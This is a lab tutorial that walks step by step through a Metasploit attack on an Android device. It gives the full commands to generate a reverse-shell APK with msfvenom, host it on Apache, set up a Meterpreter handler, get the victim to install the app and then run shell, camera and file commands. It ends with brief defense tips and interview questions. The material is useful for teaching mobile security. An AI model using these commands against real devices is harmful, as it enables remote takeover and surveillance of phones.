# 🛡️ Practical 3 – Android Reverse Shell (Metasploit + msfvenom)

Today we will understand a **basic Android penetration testing lab practical** where we will:

✔ Generate an Android payload
✔ Host the APK using Apache server
✔ Set up a Metasploit handler
✔ Establish an Android Meterpreter session

⚠️ This practical is only for an **authorized lab environment (Kali + Android Emulator/Test Device)**.

---

# 1️⃣ Basic Concept 📌

## 📌 What is an Android Reverse Shell?

In an Android reverse shell:

👉 The Android device sends a reverse connection to the attacker machine.

Meaning:

* Kali Linux waits in listener mode
* Android device itself initiates the connection

---

## 🧠 Simple Flow

```text
Attacker (Kali)  <------  Android Device / Emulator
      Listener          Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Systems

✔ Kali Linux (Attacker)
✔ Android Emulator / Test Android Device
✔ Same Network

---

# 📌 Recommended Android Emulator

Examples:

✔ Android Studio Emulator
✔ Genymotion
✔ Virtual Android Lab

---

# 3️⃣ Find Kali IP Address 🌐

## 📌 Check IP

```bash
ip a
```

Example:

```text
192.168.1.10
```

👉 This is the attacker machine's IP
👉 This is what we call **LHOST**.

---

# 4️⃣ Generate Android Payload 🧨

## 📌 Purpose

Generate an Android APK that creates a reverse Meterpreter session when executed.

---

## ⚙️ Command

```bash
msfvenom -p android/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
R > malicious.apk
```

---

# 🧠 Command Breakdown

| Parameter                       | Meaning                             |
| ------------------------------- | ----------------------------------- |
| msfvenom                        | Payload generator                   |
| -p                              | Payload type                        |
| android/meterpreter/reverse_tcp | Android Meterpreter reverse payload |
| LHOST                           | Kali attacker IP                    |
| LPORT                           | Listening port                      |
| R                               | Raw APK output                      |
| > malicious.apk                 | Save APK file                       |

---

# 📌 Output

✔ `malicious.apk` is generated
✔ This is the Android payload APK

---

# 5️⃣ Apache Web Server Setup 🌐

## 📌 Purpose

Host the APK so the Android device can download it.

---

# 📁 Move APK to Web Directory

```bash
sudo mv malicious.apk /var/www/html/
```

---

# 🚀 Start Apache Server

```bash
sudo systemctl start apache2
```

---

# 📌 Check Status

```bash
sudo systemctl status apache2
```

---

# 🌍 Access APK

Open in browser:

```text
http://192.168.1.10/malicious.apk
```

If download starts → hosting is successful.

---

# 6️⃣ Start Metasploit ⚙️

## 📌 Open Framework

```bash
msfconsole
```

---

# 7️⃣ Configure Handler 🎯

## 📌 Use Multi Handler

```bash
use exploit/multi/handler
```

---

## 📌 Set Payload

```bash
set payload android/meterpreter/reverse_tcp
```

---

## 📌 Configure Network

```bash
set LHOST 192.168.1.10
```

```bash
set LPORT 4444
```

---

# 8️⃣ Start Listener ▶️

```bash
exploit
```

or

```bash
run
```

---

# 📌 Status

✔ Metasploit will now wait for the reverse connection.

---

# 9️⃣ Download APK on Android 📲

## 📌 Android Emulator / Device

Open browser:

```text
http://192.168.1.10/malicious.apk
```

---

## 📌 Install APK

Android will show an installation warning.

If it's a lab environment:

✔ Enable "Install unknown apps"
✔ Install the APK

---

# 🔟 Execute Payload ▶️

## 📌 Open Installed App

After APK installation:

✔ Open the app

As soon as the app runs:

👉 A reverse connection will be sent to Metasploit.

---

# 1️⃣1️⃣ Session Establishment 🔗

If successful:

```text
Meterpreter session opened
```

---

# 1️⃣2️⃣ Basic Android Meterpreter Commands 📱

## 📌 Device Info

```bash
sysinfo
```

---

## 📌 Shell Access

```bash
shell
```

---

## 📌 Current App/User

```bash
getuid
```

---

## 📌 File Listing

```bash
ls
```

---

## 📌 Webcam / Camera List

```bash
webcam_list
```

---

# 📌 Overall Attack Flow Summary 🔥

```text
1. Find Kali IP
2. Generate Android APK payload
3. Move APK to Apache directory
4. Start Apache server
5. Configure Metasploit handler
6. Start listener
7. Download APK on Android
8. Install APK
9. Execute app
10. Meterpreter session established
```

---

# 🛡️ Why Modern Android Blocks This

## 📌 Security Protections

✔ Google Play Protect
✔ APK signature checks
✔ Antivirus apps
✔ Unknown sources restrictions
✔ Runtime permissions

---

# 📌 Why Payloads Often Fail Today

✔ Android version incompatibility
✔ Meterpreter detection
✔ Play Protect removal
✔ SELinux enforcement
✔ Background execution restrictions

---

# 📌 Defense Methods

✔ Don't install unknown APKs
✔ Keep Play Protect enabled
✔ Use trusted app stores
✔ Review permissions carefully
✔ Keep Android updated

---

# ⚡ Android Emulator vs Real Device

| Emulator              | Real Device         |
| --------------------- | ------------------- |
| Easy testing          | Real-world behavior |
| Safer lab environment | More restrictions   |
| Snapshot restore      | Hardware dependent  |

---

# 🎯 Interview Questions

✔ What is Android Meterpreter?
✔ Why is reverse TCP used?
✔ Why does the APK installation warning appear?
✔ Difference between Android APK and Linux ELF?
✔ Why must the payload match the handler?

---

# 🏁 Final Thought

This practical is a foundational concept of Android penetration testing:

👉 APK payload generation
👉 Reverse TCP communication
👉 Meterpreter session handling
👉 Android app execution model

If this is clear →
Advanced Android exploitation and mobile security concepts become easier 🔥